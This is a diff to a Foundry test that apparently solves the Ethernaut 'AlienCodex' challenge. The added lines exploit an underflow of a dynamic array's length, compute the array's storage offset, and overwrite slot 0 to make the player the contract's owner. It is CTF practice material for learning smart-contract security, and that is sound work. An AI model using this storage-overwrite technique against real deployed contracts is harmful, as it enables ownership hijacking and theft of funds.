@@ -17,5 +17,15 @@ contract AlienCodexLevel is SetUpLevelTest {
         alienCodex = AlienCodex(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        alienCodex.makeContact();
+        alienCodex.retract();
+        uint256 n = uint256(keccak256(abi.encodePacked(uint256(1))));
+        uint256 i;
+        unchecked {
+            i -= n;
+        }
+        alienCodex.revise(i, bytes32(uint256(uint160(player))));
+        vm.stopPrank();
     }
 }
